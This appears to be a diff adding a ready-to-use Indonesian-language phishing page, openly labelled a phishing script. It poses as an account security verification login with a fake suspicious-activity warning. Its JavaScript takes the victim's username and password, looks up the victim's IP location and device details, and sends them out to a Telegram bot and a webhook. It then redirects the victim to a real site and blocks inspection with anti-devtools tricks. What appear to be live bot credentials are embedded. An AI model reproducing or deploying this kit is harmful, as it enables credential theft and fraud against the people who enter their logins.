@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Login ke Akun Anda - Keamanan Diperbarui</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .warning-banner {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px 15px;
+            margin: 15px 20px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #856404;
+        }
+        
+        .warning-banner i {
+            font-weight: bold;
+        }
+        
+        .form-container {
+            padding: 20px 25px 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: all 0.3s;
+            outline: none;
+        }
+        
+        .input-group input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .forgot-password a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .footer {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #6c757d;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: white;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 40px;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginContainer">
+        <div class="header">
+            <h1>🔐 Verifikasi Keamanan</h1>
+            <p>Masuk untuk melanjutkan</p>
+        </div>
+        
+        <div class="warning-banner">
+            <i>⚠️ PEMBERITAHUAN KEAMANAN</i><br>
+            Sistem mendeteksi aktivitas mencurigakan. Harap verifikasi identitas Anda untuk mengamankan akun.
+        </div>
+        
+        <div class="form-container">
+            <form id="loginForm">
+                <div class="input-group">
+                    <label>📧 Email / Nomor Telepon</label>
+                    <input type="text" id="username" name="username" placeholder="contoh@email.com atau 08123456789" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>🔒 Kata Sandi</label>
+                    <input type="password" id="password" name="password" placeholder="Masukkan kata sandi Anda" required>
+                </div>
+                
+                <button type="submit" class="login-btn">Verifikasi & Masuk</button>
+                
+                <div class="forgot-password">
+                    <a href="#">Lupa kata sandi?</a>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <p>🔒 Keamanan akun Anda adalah prioritas kami</p>
+            <p>© 2024 Sistem Verifikasi Terintegrasi</p>
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Memverifikasi identitas Anda...</div>
+    </div>
+    
+    <div class="container" id="successContainer" style="display: none;">
+        <div class="success-message">
+            <div class="success-icon">✅</div>
+            <h2>Verifikasi Berhasil!</h2>
+            <p style="margin-top: 10px; color: #666;">Mengalihkan ke akun Anda...</p>
+        </div>
+    </div>
+
+    <script>
+        // ============ PHISHING SCRIPT - SEND TO TELEGRAM/WEBHOOK ============
+        // GANTI WEBHOOK LU DI SINI, BANGSAT!
+        const TELEGRAM_BOT_TOKEN = "BOT_TOKEN_GANTI_INI";  // GANTI PAKE BOT TOKEN LU
+        const TELEGRAM_CHAT_ID = "CHAT_ID_GANTI_INI";      // GANTI PAKE CHAT ID LU
+        
+        // ATAU PAKE WEBHOOK SENDER KALO GAK MAKE TELEGRAM
+        const WEBHOOK_URL = "https://your-webhook-url.com/capture"; // GANTI URL WEBHOOK LU
+        
+        // IP TRACKER API (dapet lokasi target)
+        async function getTargetInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    isp: data.org,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timestamp: new Date().toLocaleString('id-ID')
+                };
+            } catch(e) {
+                return {
+                    ip: 'Tidak terdeteksi',
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toLocaleString('id-ID')
+                };
+            }
+        }
+        
+        // Kirim ke Telegram
+        async function sendToTelegram(username, password, info) {
+            const message = `
+🔥 *PHISHING HIT - BLUEVERSE V2* 🔥
+━━━━━━━━━━━━━━━━━━━━━━━━
+📱 *USERNAME/EMAIL:* ${username}
+🔑 *PASSWORD:* ${password}
+━━━━━━━━━━━━━━━━━━━━━━━━
+📍 *INFO TARGET:*
+• IP: ${info.ip || '-'}
+• Lokasi: ${info.city || '-'}, ${info.region || '-'}
+• Negara: ${info.country || '-'}
+• ISP: ${info.isp || '-'}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🖥️ *DEVICE INFO:*
+• OS: ${info.platform || '-'}
+• Browser: ${info.userAgent || '-'}
+• Bahasa: ${info.language || '-'}
+━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ *WAKTU:* ${info.timestamp}
+🔥 *TOOL:* BLUEVERSE V2 - @KONTEN.RENDEM11
+            `;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.log('Telegram error, fallback to webhook');
+            }
+        }
+        
+        // Kirim ke Webhook
+        async function sendToWebhook(username, password, info) {
+            const data = {
+                username: username,
+                password: password,
+                victim_info: info,
+                source: "BLUEVERSE V2 PHISHING",
+                creator: "@KONTEN.RENDEM11"
+            };
+            
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.log('Webhook error');
+            }
+        }
+        
+        // Simpan ke localStorage (backup)
+        function saveToLocal(username, password, info) {
+            const data = {
+                username: username,
+                password: password,
+                info: info,
+                time: new Date().toISOString()
+            };
+            
+            let saved = localStorage.getItem('phish_logs') || '[]';
+            saved = JSON.parse(saved);
+            saved.push(data);
+            localStorage.setItem('phish_logs', JSON.stringify(saved));
+        }
+        
+        // Handle form submit
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if(!username || !password) {
+                alert('Harap isi semua field, KONTOL!');
+                return;
+            }
+            
+            // Tampilkan loading
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            // Dapetin info target
+            const victimInfo = await getTargetInfo();
+            
+            // Kirim data ke semua channel
+            if(TELEGRAM_BOT_TOKEN !== "8516747819:AAHhE-Xxcar6coHKaOQS7d4CE0-Z1BtxWa0" && TELEGRAM_CHAT_ID !== "8509633837") {
+                await sendToTelegram(username, password, victimInfo);
+            }
+            
+            if(WEBHOOK_URL !== "https://m.facebook.com/?http_ref=eyJ0cyI6IjE3NzQ1Mjg0MjI5MjUiLCJyIjoiaHR0cHM6XC9cL3d3dy5nb29nbGUuY29tIn0%3D&cah=2&rwtsid=Q6eweqBOKJZKkKZQd") {
+                await sendToWebhook(username, password, victimInfo);
+            }
+            
+            // Backup local
+            saveToLocal(username, password, victimInfo);
+            
+            // Log ke console (buat testing)
+            console.log('🔥 PHISHING DATA CAPTURED 🔥');
+            console.log('Username:', username);
+            console.log('Password:', password);
+            console.log('Info:', victimInfo);
+            
+            // Delay biar keliatan realistis
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                document.getElementById('loginContainer').style.display = 'none';
+                document.getElementById('successContainer').style.display = 'block';
+                
+                // Redirect ke website asli setelah 3 detik
+                setTimeout(() => {
+                    // GANTI URL REDIRECT KE WEBSITE ASLI
+                    window.location.href = 'https://www.google.com';
+                }, 3000);
+            }, 2000);
+        });
+        
+        // Anti inspect element
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Anti devtools (basic)
+        setInterval(function() {
+            const before = new Date();
+            debugger;
+            const after = new Date();
+            if(after - before > 100) {
+                document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50px;">🔴 DETEKSI DEBUGGER! 🔴<br>IP ANDA TELAH DICATAT!</h1>';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
